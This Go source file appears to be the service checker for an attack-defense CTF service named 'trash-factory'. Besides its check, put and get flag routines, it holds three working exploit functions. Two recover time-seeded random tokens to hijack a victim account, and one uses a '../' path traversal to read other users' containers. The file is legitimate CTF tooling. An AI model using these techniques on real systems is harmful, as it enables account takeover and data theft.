package main

import (
	"encoding/binary"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"github.com/gocolly/colly"
	log "github.com/sirupsen/logrus"
	"math/rand"
	"net"
	"net/http"
	"reflect"
	"regexp"
	"strings"
	"time"
	"trash-factory/pkg/api"
	"trash-factory/pkg/models"
)

const (
	OK            = 101 //# operation has been finished sucessfully
	CORRUPT       = 102 // # service is working, but there is no correct flag (only for "get" ops)
	MUMBLE        = 103 // # service is working incorrect (iex: not responding to the protocol)
	DOWN          = 104 //# service not working (iex: no tcp connection can be initialized)
	CHECKER_ERROR = 110 // # something gone wrong with args or with remote part of checker
)

type Verdict struct {
	Code   int
	Reason string
}

type CheckerError struct {
	Verdict Verdict
	Err     error
}

func (e *CheckerError) Unwrap() error { return e.Err }

func (e *CheckerError) Error() string {
	return e.Verdict.Reason
}

func NewVerdict(code int, reason string) *CheckerError {
	return &CheckerError{
		Verdict: Verdict{
			Code:   code,
			Reason: reason,
		},
		Err: errors.New(reason),
	}
}

type Endpoints struct {
	Addr    string
	WebPort string
	CPPort  string
}

func (e Endpoints) GetCPUrl() string {
	return e.Addr + ":" + e.CPPort
}

func (e Endpoints) GetWebUrl() string {
	return e.Addr + ":" + e.WebPort
}

func main() {
	rand.Seed(time.Now().UnixMilli())
	addr := flag.String("addr", "", "backend url")
	command := flag.String("command", "", "command : check, put1, put2, get1, get2")
	data := flag.String("data", "", "data string")
	flag.Parse()

	v := Run(addr, command, data)
	fmt.Println(fmt.Sprintf("VERDICT_CODE:%d", v.Code))
	fmt.Println(fmt.Sprintf("VERDICT_REASON:%s", v.Reason))
}

func HackRandom2(addr string) error {
	endpoints := GetEndpoint(&addr)
	now := time.Now()
	tokenKey, token, err := CreateUser(endpoints.GetWebUrl())
	if err != nil {
		return err
	}
	for i := time.Now().Add(-15 * time.Minute); !i.After(now); i = i.Add(time.Second) {
		rand.Seed(-1)
		rand.Seed(i.Unix())
		lastb := make([]byte, 8)
		binary.LittleEndian.PutUint64(lastb, rand.Uint64())
		first := hex.EncodeToString(lastb)
		for j := 0; j < 5; j++ {
			nextb := make([]byte, 8)
			binary.LittleEndian.PutUint64(nextb, rand.Uint64())
			second := hex.EncodeToString(nextb)
			aclient := api.NewClient(endpoints.GetCPUrl(), second, first)
			_, err := aclient.CreateUser()
			if err == nil {
				log.Info("User created")
				user, err := aclient.GetUser(tokenKey)
				if err != nil {
					return err
				}
				if hex.EncodeToString(user.Token) == token {
					log.Info("Done")
					return nil
				}
				return nil
			}
			first = second
		}
	}

	return error(NewVerdict(MUMBLE, "Something wrong"))
}

func HackRandom(addr string) error {
	endpoints := GetEndpoint(&addr)
	tokenKey, _, err := CreateUser(endpoints.GetWebUrl())
	if err != nil {
		log.Error(err)
		return err
	}
	victimKey, victimToken, err := CreateUser(endpoints.GetWebUrl())
	client := api.NewClient(endpoints.GetCPUrl(), victimKey, victimToken)
	err = client.SetUserDescription(victimKey, "secret")
	if err != nil {
		return err
	}

	now := time.Now()
	for i := time.Now().Add(-120 * time.Minute); !i.After(now); i = i.Add(time.Second) {
		//fmt.Println(i)
		rand.Seed(i.Unix())
		for i := 0; i < 10000; i++ {
			gtokenKey := make([]byte, 8)
			binary.LittleEndian.PutUint64(gtokenKey, rand.Uint64())
			if hex.EncodeToString(gtokenKey) == tokenKey {
				log.Info("Found!")

				for true {
					token := make([]byte, 8)
					binary.LittleEndian.PutUint64(token, rand.Uint64())
					aclient := api.NewClient(endpoints.GetCPUrl(), victimKey, hex.EncodeToString(token))
					user, err := aclient.GetUser(victimKey)
					if err == nil {
						log.Info("Get secret :" + user.Description)
						return nil
					}
				}

				return nil
			}
		}
	}

	return error(NewVerdict(MUMBLE, "Something wrong"))
}

func HackPT(addr string) error {
	endpoints := GetEndpoint(&addr)
	tokenKey, token, err := CreateUser(endpoints.GetWebUrl())
	if err != nil {
		log.Error(err)
		return err
	}
	client := api.NewClient(endpoints.GetCPUrl(), tokenKey, token)
	cId, err := client.CreateContainer(4, "victim")
	if err != nil {
		return err
	}
	err = client.PutItem(models.Item{
		Type:        1,
		Description: "secret",
		Weight:      1,
	}, cId)
	if err != nil {
		return err
	}

	atokenKey, atoken, err := CreateUser(endpoints.GetWebUrl())
	if err != nil {
		log.Error(err)
		return err
	}
	aclient := api.NewClient(endpoints.GetCPUrl(), atokenKey, atoken)
	_, err = aclient.CreateContainer(3, "folder init")
	for i := 0; true; i++ {
		stat, err := aclient.GetStat(i*20, (i+1)*20)
		if err != nil {
			return err
		}
		if len(stat.Users) == 0 {
			return error(NewVerdict(MUMBLE, "Not found"))
		}
		for _, user := range stat.Users {
			sprintf := fmt.Sprintf("../%s/1", user.TokenKey)
			log.Info("Try " + sprintf)
			container, err := aclient.GetContainerInfo(sprintf)
			if err != nil {
				log.Warn("Can't get for " + user.TokenKey)
				continue
			}
			for _, item := range container.Items {
				if item.Description == "secret" {
					log.Info("Get secret")
					return nil
				}
			}
		}
	}

	return error(NewVerdict(MUMBLE, "Something wrong"))
}

func Test() {
	adrr := "10.118.103.11"
	command := "check"
	data := ""
	v := Run(&adrr, &command, &data)
	fmt.Println(fmt.Sprintf("VERDICT_CODE:%d", v.Code))
	fmt.Println(fmt.Sprintf("VERDICT_REASON:%s", v.Reason))

	command = "put1"
	data = "flag"
	fl1 := "flag1"
	v = Run(&adrr, &command, &fl1)
	fmt.Println(fmt.Sprintf("VERDICT_CODE:%d", v.Code))
	fmt.Println(fmt.Sprintf("VERDICT_REASON:%s", v.Reason))

	command = "get1"
	v = Run(&adrr, &command, &v.Reason)
	fmt.Println(fmt.Sprintf("VERDICT_CODE:%d", v.Code))
	fmt.Println(fmt.Sprintf("VERDICT_REASON:%s", v.Reason))

	command = "put2"
	data = "flag"
	v = Run(&adrr, &command, &data)
	fmt.Println(fmt.Sprintf("VERDICT_CODE:%d", v.Code))
	fmt.Println(fmt.Sprintf("VERDICT_REASON:%s", v.Reason))

	command = "get2"
	v = Run(&adrr, &command, &v.Reason)
	fmt.Println(fmt.Sprintf("VERDICT_CODE:%d", v.Code))
	fmt.Println(fmt.Sprintf("VERDICT_REASON:%s", v.Reason))
}

func Run(adrr *string, command *string, data *string) Verdict {
	endpoint := GetEndpoint(adrr)

	switch *command {
	case "check":
		err := Check(&endpoint)
		verdict, failed := EnsureSuccess(err)
		if failed {
			return verdict
		}
		return Verdict{
			Code:   OK,
			Reason: "",
		}
	case "put1":
		tokenKey, token, err := Put_User(&endpoint, *data)
		verdict, failed := EnsureSuccess(err)
		if failed {
			return verdict
		}
		return Verdict{
			Code:   OK,
			Reason: fmt.Sprintf("%s:%s:%s", tokenKey, token, *data),
		}
	case "get1":
		parts := strings.Split(*data, ":")
		err := Get_User(&endpoint, parts[0], parts[1], parts[2])
		verdict, failed := EnsureSuccess(err)
		if failed {
			return verdict
		}
		return Verdict{
			Code:   OK,
			Reason: "",
		}
	case "put2":
		tokenKey, token, containerId, err := Put_Item(&endpoint, *data)
		verdict, failed := EnsureSuccess(err)
		if failed {
			return verdict
		}
		return Verdict{
			Code:   OK,
			Reason: fmt.Sprintf("%s:%s:%s:%s", tokenKey, token, containerId, *data),
		}
	case "get2":
		parts := strings.Split(*data, ":")
		flag := parts[3]
		err := Get_Item(&endpoint, parts[0], parts[1], parts[2], flag)
		verdict, failed := EnsureSuccess(err)
		if failed {
			return verdict
		}
		return Verdict{
			Code:   OK,
			Reason: "",
		}
	}

	return Verdict{
		Code:   CHECKER_ERROR,
		Reason: "Unknown operation",
	}
}

func GetEndpoint(adrr *string) Endpoints {
	cpPort := "9090"
	webPort := "8080"
	host := *adrr
	if strings.Contains(*adrr, ":") {
		parts := strings.Split(*adrr, ":")
		host = parts[0]
		port := parts[1]
		cpPort = "21" + port[2:]
		webPort = "11" + port[2:]
	}

	endpoint := Endpoints{
		CPPort:  cpPort,
		WebPort: webPort,
		Addr:    host,
	}
	return endpoint
}

func EnsureSuccess(err error) (Verdict, bool) {
	if err != nil {
		if oerr, ok := err.(*net.OpError); ok {
			return Verdict{
				Code:   DOWN,
				Reason: oerr.Error(),
			}, true
		}
		if cerr, ok := err.(*CheckerError); ok {
			return cerr.Verdict, true
		}

		return Verdict{
			Code:   MUMBLE,
			Reason: err.Error(),
		}, true
	}
	return Verdict{}, false
}

func Check(endpoints *Endpoints) error {
	tokenKey, token, err := CreateUser(endpoints.GetWebUrl())
	if err != nil {
		log.Error(err)
		return err
	}
	client := api.NewClient(endpoints.GetCPUrl(), tokenKey, token)
	err = CheckUser(err, client, tokenKey)
	if err != nil {
		return err
	}

	i := 0
	for {
		stat, err := client.GetStat(i*20, (i+1)*20)
		if err != nil {
			return err
		}

		if len(stat.Users) == 0 {
			return error(NewVerdict(MUMBLE, "Stats corrupted"))
		}

		for _, user := range stat.Users {
			if user.TokenKey == tokenKey {
				log.Info("Check OK")
				return nil
			}
		}
		i++
	}
}

func CheckUser(err error, client *api.Client, tokenKey string) error {
	log.Info("Try get user")
	userDescription := GenerateDescription()
	err = client.SetUserDescription(tokenKey, userDescription)
	user, err := client.GetUser(tokenKey)
	if err != nil {
		return err
	}

	if user.TokenKey != tokenKey {
		return error(NewVerdict(MUMBLE, "Not this user"))
	}

	if user.Description != userDescription {
		return error(NewVerdict(MUMBLE, "Incorrect description"))
	}

	size := 5
	description := GetContainerDescription()
	log.Info("Try create container")
	containerId, err := client.CreateContainer(size, description)
	if err != nil {
		return err
	}

	expectedContainer := models.Container{
		ID:          containerId,
		Description: description,
		Size:        uint8(size),
		Items:       []models.Item{},
	}

	for i := 0; i < size; i++ {
		expectedItem := ItemsGenerator()
		expectedContainer.Items = append(expectedContainer.Items, expectedItem)
		log.Info("Try put item")
		err = client.PutItem(expectedItem, containerId)
		if err != nil {
			return err
		}
		log.Info("Try get item")
		actualItem, err := client.GetItem(containerId, i)
		if err != nil {
			return err
		}
		if !reflect.DeepEqual(actualItem, expectedItem) {
			return error(NewVerdict(MUMBLE, "Actual items not equal expected"))
		}
	}
	log.Info("Try get container")
	container, err := client.GetContainerInfo(containerId)
	if err != nil {
		return err
	}

	if !reflect.DeepEqual(container, expectedContainer) {
		return error(NewVerdict(MUMBLE, "Actual container not equal expected"))
	}
	return nil
}

func GenerateDescription() string {
	return "desc"
}

func Put_User(endpoints *Endpoints, flag string) (string, string, error) {
	log.Info("Try Put User")
	tokenKey, token, err := CreateUser(endpoints.GetWebUrl())
	client := api.NewClient(endpoints.GetCPUrl(), tokenKey, token)
	err = client.SetUserDescription(tokenKey, flag)
	if err != nil {
		return "", "", err
	}
	return tokenKey, token, err
}

func Get_User(e *Endpoints, tokenKey string, token string, flag string) error {
	log.Info("Try Get User")
	client := api.NewClient(e.GetCPUrl(), tokenKey, token)
	user, err := client.GetUser(tokenKey)
	if err != nil {
		return err
	}

	log.Info(user)
	log.Info(flag)
	if user.Description != flag {
		return error(NewVerdict(CORRUPT, "Flag corrupted"))
	}
	log.Info("Get User OK")
	return nil
}

func Put_Item(e *Endpoints, flag string) (string, string, string, error) {
	log.Info("Try Put Item")
	tokenKey, token, err := CreateUser(e.GetWebUrl())
	client := api.NewClient(e.GetCPUrl(), tokenKey, token)
	containerId, err := client.CreateContainer(3, GetContainerDescription())
	if err != nil {
		return "", "", "", err
	}

	item := ItemsGenerator()
	item.Description = flag
	err = client.PutItem(item, containerId)
	if err != nil {
		return "", "", "", err
	}
	log.Info("Put Item OK")
	return tokenKey, token, containerId, err
}

func Get_Item(e *Endpoints, tokenKey string, token string, containerId, flag string) error {
	log.Info("Try Get Item")
	client := api.NewClient(e.GetCPUrl(), tokenKey, token)
	item, err := client.GetItem(containerId, 0)
	if err != nil {
		return err
	}
	if item.Description != flag {
		return error(NewVerdict(CORRUPT, "Flag corrupted"))
	}
	log.Info("Get Item OK")
	return nil
}

func CreateUser(addr string) (string, string, error) {
	for i := 0; i < 5; i++ {
		key, token, err := CreateUserBase(addr)
		if err == nil {
			return key, token, err
		} else {
			log.Error(err)
		}
	}
	return "", "", error(NewVerdict(MUMBLE, "Can't register user"))
}

func CreateUserBase(addr string) (string, string, error) {
	var tokenKey string
	var token string
	c := colly.NewCollector()
	c.AllowURLRevisit = true
	c.WithTransport(&http.Transport{
		Proxy: http.ProxyFromEnvironment,
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 10 * time.Second,
			DualStack: true,
		}).DialContext,
		MaxIdleConns:          100,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
	})

	c.OnHTML("a[href=\"/token\"]", func(e *colly.HTMLElement) {
		err := e.Request.Visit(e.Attr("href"))
		if err != nil {
			log.Error(err)
			return
		}
	})

	c.OnHTML("div[class=\"token-info\"]", func(e *colly.HTMLElement) {
		keyPattern := regexp.MustCompile("TOKEN KEY: (.*)")
		tokkenPattern := regexp.MustCompile("TOKEN: (.*)")
		r := keyPattern.FindStringSubmatch(e.Text)
		if r != nil {
			tokenKey = r[1]
		}
		r = tokkenPattern.FindStringSubmatch(e.Text)
		if r != nil {
			token = r[1]
		}
	})

	err := c.Visit(fmt.Sprintf("http://%s", addr))

	if tokenKey == "" || token == "" {
		log.Error(fmt.Sprintf("%s. Key %s Token %s", "Can't parse user", tokenKey, token))
		return "", "", error(NewVerdict(MUMBLE, "Can't register user"))
	}

	return tokenKey, token, err
}

func ItemsGenerator() models.Item {
	return models.Item{
		Type:        1,
		Description: "test item",
		Weight:      10,
	}
}

func GetContainerDescription() string {
	return "test container"
}
